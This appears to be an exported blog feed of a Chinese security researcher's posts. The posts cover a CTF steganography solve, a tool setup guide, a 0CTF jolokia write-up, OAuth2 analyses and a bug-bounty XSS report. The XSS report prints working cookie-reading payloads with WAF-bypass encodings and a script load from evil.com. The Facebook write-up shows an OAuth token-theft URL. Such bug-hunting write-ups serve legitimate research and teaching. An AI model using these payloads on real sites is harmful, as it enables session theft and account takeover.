alt="image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png-212.3kB"></p><p>看到根目录存在ffxxx的文件，直接用file去读<br><img src="http://static.zybuluo.com/1160307775/8qtcm0dqetiop2w9ccw2tr8k/image_1d7rmhg0ls1l3ptm8k29n614e5.png" alt="image_1d7rmhg0ls1l3ptm8k29n614e5.png-27.7kB"></p><h1 id="MISC3-TTL隐写"><a href="#MISC3-TTL隐写" class="headerlink" title="MISC3 TTL隐写"></a>MISC3 TTL隐写</h1><p>给了个本文，里面是很多TTL值。hint说隐藏了信息。<br><img src="http://static.zybuluo.com/1160307775/m9tv96888aiofm7wv51e4bp3/image_1d7ttpfr51j1m1jks1rd3bafkqjp.png" alt="image_1d7ttpfr51j1m1jks1rd3bafkqjp.png-31.8kB"></p><p>在网上找了一下，发现在MISC中有一项技术叫TTL隐写。</p><p>大致的隐写流程如下：<br>将TTL的值转为8位二进制，高位补0，取头两位的二进制。这样4个TTL的值就能取够一个8位的二进制数，再将这个8位的二进制转换为字符(因为一个字符=一个字节=8位二进制)。</p><p>这就是成功将字符隐写在TTL值中，所以只需要逆出来取8位还原成字符就行，写了个提取脚本</p><pre><code>#! /usr/bin/python3# Author: Hpdoger@d0g3count = 0change_list = []word_list = &#39;&#39;zimus = &#39;&#39;with open(&quot;ttls.txt&quot;,&quot;r&quot;) as file:    for ttl in file.readlines():        change_list.append(ttl.replace(&#39;TTL=&#39;,&#39;&#39;))        if len(change_list) == 4:            for num in change_list:                num = int(num)                a = bin(num).replace(&#39;0b&#39;,&#39;&#39;)                b = str(&quot;%08d&quot; % int(a))                infront = b[0:2]                word_list = word_list + infront            zimu = int(word_list,2)            zimus = zimus+chr(zimu)            word_list = &#39;&#39;            change_list.clear()            count = 0with open(&#39;results.txt&#39;,&#39;w&#39;) as file2:    file2.write(zimus)</code></pre><p>转换出来的结果如下<br><img src="http://static.zybuluo.com/1160307775/0ulidat6fp1h55b84nrtusak/image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png" alt="image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png-147.1kB"></p><p>一看就是16进制，开头ffd8ff是图片头，拖到winhex里还原成图片就行了，最后还原出来4个二维码。</p><p>拼接扫描得到:</p><pre><code>key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}</code></pre><p>维吉尼亚密码解密，得到<br>flag{2028ab39927df1d96e6a12b03j58002v}<br>再进行一次字母转换<br>e-&gt;j,e-&gt;v<br>flag{2028ab39927df1d96e6a12b03e58002e}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;西湖论剑2019-Writeup&quot;&gt;&lt;a href=&quot;#西湖论剑2019-Writeup&quot; class=&quot;headerlink&quot; title=&quot;西湖论剑2019-Writeup&quot;&gt;&lt;/a&gt;西湖论剑2019-Writeup&lt;/h1&gt;&lt;p&gt;Author:Hpdoger
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SRC挖掘初探之随缘XSS挖掘</title>
    <link href="https://hpdoger.cn/2019/04/05/SRC%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2%E4%B9%8B%E9%9A%8F%E7%BC%98XSS%E6%8C%96%E6%8E%98/"/>
    <id>https://hpdoger.cn/2019/04/05/SRC挖掘初探之随缘XSS挖掘/</id>
    <published>2019-04-04T16:00:00.000Z</published>
    <updated>2019-04-05T10:07:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文首发于先知社区：<a href="https://xz.aliyun.com/t/4625" target="_blank" rel="noopener">https://xz.aliyun.com/t/4625</a></p><p>Author:Hpdoger@D0g3</p><p>最近试着去学挖洞，在测某SRC的一些业务时发现以下几个XSS的点。对于一些请求参数在返回的html中以隐蔽的标签形式出现的XSS，感觉还是挺常见的。这里我写了个Bp的插件用来监听请求并捕获这种情况:<a href="https://github.com/Hpd0ger/SuperTags" target="_blank" rel="noopener">SuperTags</a></p><p>下面的案例和讨论如果有什么片面或错误的地方，还望师傅们斧正</p><h1 id="登陆跳转处XSS"><a href="#登陆跳转处XSS" class="headerlink" title="登陆跳转处XSS"></a>登陆跳转处XSS</h1><p>某处登陆页面看了眼表单，同时跟进事件绑定的对象utils<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093334-a9875eec-5679-1.png" alt="image_1d6vk2rs4g541hq8olo1sf275i1g.png-83kB"></p><p>直接截出登陆验证部分，redata是响应参数，登陆成功为0。host定义为<strong>normal.com</strong>。这里发现其实在登陆的时候是可以存在一个cb参数的(但之前我登陆的时候并没有察觉，因为是后台有个功能loginout，点击才会附带cb参数到登录页)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac41e300-5679-1.png" alt></p><p>其中,getparam方法如下</p><pre><code>getParam: function(c_name) {    var urlParams = location.href;    var c_start = urlParams.indexOf(c_name + &quot;=&quot;);銆€    if (c_start != -1) {        c_start = c_start + c_name.length + 1;銆€        c_end = urlParams.indexOf(&quot;&amp;&quot;, c_start);        if (c_end == -1) {            c_end = urlParams.length;        }        return urlParams.substring(c_start, c_end);    }else{        return null;    }},</code></pre><p>这里开发者还是对cb参数进行了意识形态的过滤，如果cb不包含host则强制重定向首页。但是略鸡肋，直接把host放在注释符后就能绕过。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac53408c-5679-1.png" alt="image_1d6vkg95e1vjv155m1s1n1c7oook3d.png-54.2kB"></p><p>POC：</p><pre><code>cb=javascript:alert(document.cookie);//normal.com</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac649418-5679-1.png" alt="image_1d6vko6a51n64961h1pcd370647.png-127.7kB"></p><h1 id="Image处的XSS"><a href="#Image处的XSS" class="headerlink" title="Image处的XSS"></a>Image处的XSS</h1><p>这是该厂商的一个移动端业务，在我测之前已经有表哥X进去了，看一下这个洞是如何产生的。</p><p>功能点:提交问题反馈，可以上传问题图片<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac846cde-5679-1.png" alt="image_1d6vivcc51p0mpm5hb61kgqti29.png-76.5kB"></p><p>漏洞逻辑：<br>上传图片-&gt;提交反馈-&gt;服务端拼接提交的img参数(uri)为img标签src属性的完整地址</p><p>测试上传一个图片后，点击提交反馈并抓包，<code>imglist</code>参数是刚才上传图片返回的uri地址。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-aca2a2bc-5679-1.png" alt="image_1d6vj4nch1a5p118b18ci1gu31olam.png-235.9kB"></p><pre><code>POST xxxx?q=index/feedback HTTP/1.1imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;</code></pre><p>问题就出在拼接标签这部分，修改imglist参数就可以闭合Src属性进行xss,使最终的img标签执行onerror事件</p><p>步骤：抓包修改img路径-&gt;拼接恶意js事件，POC：</p><pre><code>imglist=urlencode(&quot; onerror=&quot;alert(`XSS�`)&quot;&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acc0b540-5679-1.png" alt></p><p>成功弹窗<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-accf7fa8-5679-1.png" alt="image_1d6vjv0dfkis172e1mkpd9b78c13.png-78kB"></p><h1 id="邮件提交处的XSS"><a href="#邮件提交处的XSS" class="headerlink" title="邮件提交处的XSS"></a>邮件提交处的XSS</h1><p>在测试某业务的邮箱密码验证时，发现一个包含请求邮箱的页面。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acea5b84-5679-1.png" alt="image_1d6vf99vp1smijbq1q9pa1s1sfh2d.png-297.8kB"></p><p>记得之前看过一篇文章，有些服务在发送完邮件后会弹出一个“邮件已发送+email”的页面导致反射型XSS，感觉就是这种了。</p><p>随手测试了一下，发现直接waf了空格、双引号、尖括号，和”&quot;。实体了html编码的尖括号，但是没有实体html编码的双引号。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad08fdbe-5679-1.png" alt="image_1d6vf627h11u1ru6slc13uu1qqt1j.png-337.5kB"></p><p>同时在FUZZ的期间多次出现参数错误的请求，发现可能是应用层做了些过滤：</p><ol><li>email字符串长度&lt;40且@结尾</li><li>不能同时出现两个双引号、括号</li><li>正则alert(1)\prompt(1)\confim…</li></ol><p>不过只要脱离引号就好说，毕竟有很多JS事件可以调。一开始把眼光放在了input标签上测试了一些on事件，发现type是hidden，一些可视on事件都没用的。记得之前看过一个input hidden xss的一个用法是按alt+shift+x触发，poc如下</p><pre><code>urlencode(email=&amp;#34/accesskey=&amp;#34X&amp;#34/onclick=&amp;#34alert&amp;#40&#39;xss&#39;&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad17de9c-5679-1.png" alt="image_1d6vfebe9k0q1704vhff8u16cq2q.png-39kB"></p><p>但是这个poc很鸡肋。因为要打出cookie的话长度受限，且利用条件苛刻(firefox+按键)</p><p>回头看了下发现有form标签也有输出点，最初以为form能执行的JS事件就只有reset和submit，后来测试跑onmounseover也能弹框。</p><pre><code>encodeurl(email=&amp;#34/onmouseover=&amp;#34alert&amp;#40document.cookie&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad29e16e-5679-1.png" alt="image_1d71n2s5m1mnpvbslfj1iatkg99e.png-70.9kB"></p><h1 id="一个受阻的XSS"><a href="#一个受阻的XSS" class="headerlink" title="一个受阻的XSS"></a>一个受阻的XSS</h1><p>在测试某业务时发现一个有趣的参数拼接点：</p><p>iframe的src拼接url参数+后端给定的第三方host-&gt;iframe加载src</p><p>测试了一下特殊字符都给实体化了，但是又舍不得一个iframe<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad3e1f30-5679-1.png" alt="image_1d6vl16bn14i9ihun3ovnvnd4k.png-187.5kB"></p><p>经过一番寻找，发现第三方服务的登陆点存在JS跳转漏洞，用iframe加载这个第三方服务的dom-xss也能造成弹框效果<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad523f1a-5679-1.png" alt="image_1d6vleeqr1r4613u81e81cja1m3h5h.png-106.4kB"></p><p>虽然是在SRC业务站点弹的框，但真正的域应该是子页面的。打印一下COOKIE验证，果然是子页面域的cookie。由于waf掉了document.cookie和javascript:alert，我用了html编码的’:’和八进制js编码的’.’绕过，完整打印子页面域payload如下</p><pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(document\56cookie)</code></pre><p>在进一步的探索中，我做了两个尝试：</p><ol><li>尝试跳一个外域的JS，看能不能把src属性转到这个js<pre><code>https://src.com?url=redirect_uri%3Dhttps://evil.com/xss.js</code></pre>但是会把资源解析到子页面的document里，而不是src的改变<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad63994a-5679-1.png" alt="image_1d6vm2dvb1ls2185k1hof58miho5u.png-128.4kB"></li></ol><ol start="2"><li>iframe是否能调用父页面的事件呢(document)？如果可以的话我们就直接调js uri把cookie打出去。之所以有这个想法是因为，当时寻思既然站点调用这个三方服务了，很大可能性这个三方站是iframe-src白名单。不过测试后发现依然被跨域限制，测试payload<pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(window.parent.document\56cookie)</code></pre><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad6accec-5679-1.png" alt="image_1d6fi5odbg1pnb7nfdgs7ji6p.png-13.7kB"></li></ol><p>对跨域姿势了解的不多，如果有兴趣的师傅，可以一起来交流一下这种问题</p><h1 id="自闭总结"><a href="#自闭总结" class="headerlink" title="自闭总结"></a>自闭总结</h1><p>从打ctf到学着去挖洞，还是有一些思维出入的地方，慢慢理解之前师傅们说的资产收集的重要性。</p><p>也特别感谢引路人鬼麦子师傅给予的帮助，这里顺便推荐麦子师傅基于爬虫的一款开源子域名监控工具<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">get_domain</a>，在搭建过程中如果遇到环境配置问题，可以参考这篇<a href="http://hpdoger.me/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/" target="_blank" rel="noopener">Ubuntu16.04-Get_domain搭建手册</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/4625&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4625&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Author:Hpdoger@D0
      
    
    </summary>
    
    
      <category term="论坛文章" scheme="https://hpdoger.cn/tags/%E8%AE%BA%E5%9D%9B%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04-子域名监控工具Getdomain环境搭建</title>
    <link href="https://hpdoger.cn/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/"/>
    <id>https://hpdoger.cn/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/</id>
    <published>2019-03-29T16:00:00.000Z</published>
    <updated>2019-03-31T02:17:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ubuntu16-04-子域名监控Get-domain环境搭建"><a href="#Ubuntu16-04-子域名监控Get-domain环境搭建" class="headerlink" title="Ubuntu16.04-子域名监控Get_domain环境搭建"></a>Ubuntu16.04-子域名监控Get_domain环境搭建</h1><p>操作环境：Ubuntu16.04<br>数据库：Mongdb<br>项目地址：<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">https://github.com/guimaizi/get_domain</a></p><h1 id="各种依赖安装"><a href="#各种依赖安装" class="headerlink" title="各种依赖安装"></a>各种依赖安装</h1><pre><code>sudo apt-get install git python3 python3-pip xvfb unzip libxss1 libappindicator1 libindicator7 -ysudo pip3 install selenium pymongo</code></pre><h1 id="安装mongodb服务端"><a href="#安装mongodb服务端" class="headerlink" title="安装mongodb服务端"></a>安装mongodb服务端</h1><ol><li>添加mongodb签名到APT<pre><code>sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv EA312927</code></pre></li><li>创建/etc/apt/sources.list.d/mongodb-org-3.2.list文件并写入命令<pre><code>echo &quot;deb http://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.2 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.2.list</code></pre></li><li>更新软件源列表<pre><code>sudo apt-get update</code></pre></li><li>安装mongodb（默认是安装稳定版）<pre><code>sudo apt-get install -y mongodb-org</code></pre></li></ol><h1 id="配置mongodb服务端"><a href="#配置mongodb服务端" class="headerlink" title="配置mongodb服务端"></a>配置mongodb服务端</h1><ol><li><p>修改配置文件<code>/etc/mongodb.conf</code></p><pre><code>修改后的内容如下：bind_ip = 0.0.0.0port = 27017auth=true (添加帐号,密码认证)</code></pre><p>修改后重启mongodb:sudo service mongodb restart</p></li><li><p>添加超级用户</p><pre><code>use admindb.createUser({user:&#39;admin&#39;,pwd:&#39;123456aaa1xsda1A&#39;,roles:[{role:&#39;userAdminAnyDatabase&#39;,db:&#39;admin&#39;}]})db.auth(&#39;admin&#39;,&#39;123456aaa1xsda1A&#39;)</code></pre></li><li><p>添加扫描器用户</p><pre><code>use target_domaindb.createUser({user:&#39;target&#39;,pwd:&#39;123456aaaxsda1A&#39;,roles:[{role:&#39;readWrite&#39;,db:&#39;target_domain&#39;}]})db.auth(&#39;target&#39;,&#39;123456aaaxsda1A&#39;)</code></pre></li></ol><h1 id="安装chromedriver"><a href="#安装chromedriver" class="headerlink" title="安装chromedriver"></a>安装chromedriver</h1><p>先安装Chrome浏览器</p><pre><code>sudo apt-get install libxss1 libappindicator1 libindicator7wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.debsudo dpkg -i google-chrome*.debsudo apt-get install -f</code></pre><p>再安装chromedriver</p><pre><code>wget -N http://chromedriver.storage.googleapis.com/72.0.3626.7/chromedriver_linux64.zipunzip chromedriver_linux64.zipchmod +x chromedriversudo mv -f chromedriver /usr/local/share/chromedriversudo ln -s /usr/local/share/chromedriver /usr/local/bin/chromedriversudo ln -s /usr/local/share/chromedriver /usr/bin/chromedriver</code></pre><h1 id="安装go-lang"><a href="#安装go-lang" class="headerlink" title="安装go-lang"></a>安装go-lang</h1><pre><code>$ sudo apt-get update$ sudo apt-get -y upgrade$ wget https://storage.googleapis.com/golang/go1.7.linux-amd64.tar.gz$ sudo tar -xvf go1.7.linux-amd64.tar.gz$ sudo mv go /usr/local</code></pre><p>设置gopath</p><pre><code>vim /etc/profileexport GOROOT=/usr/local/go  #设置为go安装的路径，有些安装包会自动设置默认的gorootexport GOPATH=$HOME/gocode   #默认安装包的路径export PATH=$PATH:$GOROOT/bin:$GOPATH/binsource /etc/profile</code></pre><p>go env看一下是否设置成功</p><h1 id="设置Python默认为Python3"><a href="#设置Python默认为Python3" class="headerlink" title="设置Python默认为Python3"></a>设置Python默认为Python3</h1><p>文章：<a href="https://blog.csdn.net/u011534057/article/details/51615193" target="_blank" rel="noopener">https://blog.csdn.net/u011534057/article/details/51615193</a></p><p>使用文章的第二种方法：在系统级修改 Python 版本</p><h1 id="下载subfinder"><a href="#下载subfinder" class="headerlink" title="下载subfinder"></a>下载subfinder</h1><pre><code>go get github.com/subfinder/subfinder</code></pre><p>报错没关系，只要文件里有bin src就行</p><h1 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h1><p>见<a href="http://www.guimaizi.com/archives/360的启动说明" target="_blank" rel="noopener">http://www.guimaizi.com/archives/360的启动说明</a></p><p>crontab定时执行任务：<a href="https://www.jianshu.com/p/838db0269fd0" target="_blank" rel="noopener">https://www.jianshu.com/p/838db0269fd0</a></p><p>crontab文件如下，每天12点执行：</p><pre><code># everday 12:00 am exec0 0 17 * * ? python /home/get_domain/while_update.py</code></pre><p>注意最后要留个空行</p><h1 id="Mongodb操作"><a href="#Mongodb操作" class="headerlink" title="Mongodb操作"></a>Mongodb操作</h1><p>更新，否则无法进行对比，更新状态到0</p><pre><code>db.getCollection(&#39;xxx&#39;).update({&#39;state&#39;:1},{$set:{&#39;state&#39;: NumberInt(0)}},{multi:true})</code></pre><h1 id="一直运行random-start"><a href="#一直运行random-start" class="headerlink" title="一直运行random_start"></a>一直运行random_start</h1><pre><code>nohup python -u random_start.py &gt; nohup.log 2&gt;&amp;1 &amp;</code></pre><p>记得修改random_start的代码为while 1<br>可以修改五次config,运行五个后台程序</p><h1 id="各种报错解决"><a href="#各种报错解决" class="headerlink" title="各种报错解决"></a>各种报错解决</h1><h2 id="报错代码127"><a href="#报错代码127" class="headerlink" title="报错代码127"></a>报错代码127</h2><pre><code>selenium.common.exceptions.WebDriverException: Message: Service chromedriver unexpectedly exited. Status code was: 127</code></pre><p>原因是browser版本过低，跟driver不匹配，升级browser</p><pre><code>apt-get install chromium-browser</code></pre><h2 id="权限报错"><a href="#权限报错" class="headerlink" title="权限报错"></a>权限报错</h2><pre><code>selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormall</code></pre><p>chromedriver在py程序里没权限，修改代码Browser.py</p><pre><code>chrome_options.add_argument(&#39;--headless&#39;)chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>安装mongodb:<a href="https://www.jianshu.com/p/5598f1dcbb98" target="_blank" rel="noopener">https://www.jianshu.com/p/5598f1dcbb98</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ubuntu16-04-子域名监控Get-domain环境搭建&quot;&gt;&lt;a href=&quot;#Ubuntu16-04-子域名监控Get-domain环境搭建&quot; class=&quot;headerlink&quot; title=&quot;Ubuntu16.04-子域名监控Get_domain环境搭
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>0CTF2019-Web1WriteUp</title>
    <link href="https://hpdoger.cn/2019/03/25/0CTF2019-Web1WriteUp/"/>
    <id>https://hpdoger.cn/2019/03/25/0CTF2019-Web1WriteUp/</id>
    <published>2019-03-24T16:00:00.000Z</published>
    <updated>2019-03-25T15:02:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0CTF-Web1"><a href="#0CTF-Web1" class="headerlink" title="0CTF Web1"></a>0CTF Web1</h1><p>第一次打0ctf，长见识了，各路神仙满天飞..</p><p>题目地址：<a href="http://111.186.63.207:31337" target="_blank" rel="noopener">http://111.186.63.207:31337</a></p><p>需要一个karaf认证，直接双写karaf<br><img src="http://static.zybuluo.com/1160307775/jjadmv0j4cbreq70dc6l9esd/image_1d6nu1vae155hklkc5e15c41ak99.png" alt="image_1d6nu1vae155hklkc5e15c41ak99.png-15.3kB"></p><p>当时组内师傅说有jolokia<br><img src="http://static.zybuluo.com/1160307775/vbmi61p7x4a5qmtsrsqodszt/image_1d6nu81co9hr1ac74nk2rs1n3um.png" alt="image_1d6nu81co9hr1ac74nk2rs1n3um.png-49.8kB"></p><p>去搜了一下jolokia的洞，看到了Lucifaer师傅的两篇分析文章<br><a href="https://lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/#0x05-poc%E6%9E%84%E9%80%A0" target="_blank" rel="noopener">https://lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/#0x05-poc%E6%9E%84%E9%80%A0</a></p><p><a href="https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc" target="_blank" rel="noopener">https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc</a></p><p>大致意思就是，执行器可以调用jolokia的list里类的函数来执行一些操作。可是搜了一下List没有logback可以用，但是题目里很明显提示有karaf，那么是否可以通过控制器的poc安装一个karaf控制台呢？所有karaf的时候有下面这个op</p><p><img src="http://static.zybuluo.com/1160307775/j1j2pt3lm0j8jtr9b63ehk7p/image_1d6qgq8tn1qaa1hhlbr2nl413s11m.png" alt="image_1d6qgq8tn1qaa1hhlbr2nl413s11m.png-7.2kB"></p><p><img src="http://static.zybuluo.com/1160307775/m7j4c61sux7w6ovgpox6e8ol/image_1d6qgok3kjq716kir4b1k1v6as9.png" alt="image_1d6qgok3kjq716kir4b1k1v6as9.png-12kB"></p><p>最终POC，利用luciafaer师傅的post数据包改造，mbean+op+args</p><p>注意content-type:applicatio/json，bp直接发包太坑了</p><p><img src="http://static.zybuluo.com/1160307775/nwnjcjdnn91n2qa6dpk35rvn/image_1d6num88ikml1pqe1jid1sln1kuh13.png" alt="image_1d6num88ikml1pqe1jid1sln1kuh13.png-111.6kB"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0CTF-Web1&quot;&gt;&lt;a href=&quot;#0CTF-Web1&quot; class=&quot;headerlink&quot; title=&quot;0CTF Web1&quot;&gt;&lt;/a&gt;0CTF Web1&lt;/h1&gt;&lt;p&gt;第一次打0ctf，长见识了，各路神仙满天飞..&lt;/p&gt;
&lt;p&gt;题目地址：&lt;a hre
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>对“绕过Facebook Token进行CSRF账号接管”的文章解读</title>
    <link href="https://hpdoger.cn/2019/02/18/%E6%B5%85%E8%B0%88%E7%BB%95%E8%BF%87Facebook%20Token%E8%BF%9B%E8%A1%8CCSRF%E8%B4%A6%E5%8F%B7%E6%8E%A5%E7%AE%A1/"/>
    <id>https://hpdoger.cn/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/</id>
    <published>2019-02-17T16:00:00.000Z</published>
    <updated>2019-02-19T15:22:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅谈绕过Facebook-Token进行CSRF账号接管"><a href="#浅谈绕过Facebook-Token进行CSRF账号接管" class="headerlink" title="浅谈绕过Facebook Token进行CSRF账号接管"></a>浅谈绕过Facebook Token进行CSRF账号接管</h1><p>今天早上看到Sam大佬推特发了这篇文章，下午就见到先知上有译文了。为什么有译文了还要写这篇文章呢？安全圈的译文你懂的，大部分右键一把梭。</p><p>从文章本身来说，还是有比较值得学习的地方，所以摘出来流程分析一下。</p><p>原文：<a href="https://ysamm.com/?p=185" target="_blank" rel="noopener">https://ysamm.com/?p=185</a></p><p>先知译文: <a href="https://xz.aliyun.com/t/4089#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/4089#toc-5</a></p><h1 id="漏洞关键条件"><a href="#漏洞关键条件" class="headerlink" title="漏洞关键条件"></a>漏洞关键条件</h1><p>攻击者有一个oauth认证接口，即漏洞网站可以授权自己的网站</p><h1 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h1><p><img src="https://i.loli.net/2019/02/19/5c6c1ace4e4e3.jpg" alt></p><p>第二步，即location的Url如下</p><pre><code>https://www.facebook.com/comet/dialog_DONOTUSE/?url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code></pre><p>next参数为<strong>下一步跳转参数</strong>，即邮箱绑定后跳转到<code>/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code>获取token再redirect到attacker web</p><h1 id="总结-修复思考"><a href="#总结-修复思考" class="headerlink" title="总结/修复思考"></a>总结/修复思考</h1><p>漏洞新颖的点就在授权后的跳转，这也算是一种突破oauth的新思路。利用信任站点的重定向进行其它oauth的绑定，再携带token二次重定向到attacker web。</p><p>如果能再二次重定向的地方加一个权限验证，即attacker app与oauth匹配，会不会避免这样的越权呢？</p><p>其次就是，如果我们省略三方授权，直接诱导用户点击第二步的location，不就更省事了么？这点我邮寄了sam师傅，希望日后有其它研究的师傅可以指点一下~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;浅谈绕过Facebook-Token进行CSRF账号接管&quot;&gt;&lt;a href=&quot;#浅谈绕过Facebook-Token进行CSRF账号接管&quot; class=&quot;headerlink&quot; title=&quot;浅谈绕过Facebook Token进行CSRF账号接管&quot;&gt;&lt;/a&gt;浅谈
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Oauth2的两类漏洞挖掘</title>
    <link href="https://hpdoger.cn/2019/02/14/Oauth2%E7%9A%84%E4%B8%A4%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>https://hpdoger.cn/2019/02/14/Oauth2的两类漏洞挖掘/</id>
    <published>2019-02-13T16:00:00.000Z</published>
    <updated>2019-02-14T02:52:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Oauth2的两类漏洞挖掘"><a href="#Oauth2的两类漏洞挖掘" class="headerlink" title="Oauth2的两类漏洞挖掘"></a>Oauth2的两类漏洞挖掘</h1><p>一直忘了总结这个，结合OPPX的网站(无漏洞站点)说明一下</p><h2 id="redict-uri限制不严格-Oauth配置错误"><a href="#redict-uri限制不严格-Oauth配置错误" class="headerlink" title="redict_uri限制不严格(Oauth配置错误)"></a>redict_uri限制不严格(Oauth配置错误)</h2><h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>一般登陆选项是这样，常见的是QQ/微信/微博/…授权登陆<br><img src="https://i.loli.net/2019/02/14/5c64d712383f4.png" alt></p><p>点击QQ授权的时候请求包和返回包如下<br><img src="https://i.loli.net/2019/02/14/5c64d71326e9b.png" alt></p><p>request:</p><pre><code>POST /oauth2.0/authorize HTTP/1.1Host: graph.qq.comresponse_type=code&amp;client_id=100498628&amp;redirect_uri=https%3A%2F%2Fmy.oppo.com%2Fauth%2Fqqcallback&amp;scope=get_user_info%2Cadd_share%2Clist_album%2Cadd_album%2Cupload_pic%2Cadd_topic%2Cadd_one_blog%2Cadd_weibo%2Ccheck_page_fans%2Cadd_t%2Cadd_pic_t%2Cdel_t%2Cget_repost_list%2Cget_info%2Cget_other_info%2Cget_fanslist%2Cget_idolist%2Cadd_idol%2Cdel_idol%2Cget_tenpay_addr&amp;state=49085978f5e969063165246c6d07e062&amp;switch=&amp;from_ptlogin=1&amp;src=1&amp;update_auth=1&amp;openapi=80901010&amp;g_tk=1156350624&amp;auth_time=1550070856795&amp;ui=97557FF6-0331-4598-BC09-6CD21B7106E0</code></pre><p>response:</p><pre><code>HTTP/1.1 302 Moved TemporarilyServer: nginxDate: Wed, 13 Feb 2019 15:17:13 GMTContent-Type: text/htmlContent-Length: 0Connection: closeLocation: https://my.oppo.com/auth/qqcallback?code=5E0AA09C0CA8179C186688ABAF4BE043&amp;state=49085978f5e969063165246c6d07e062</code></pre><p>流程：请求graph.qq.com获得授权，拿到auth 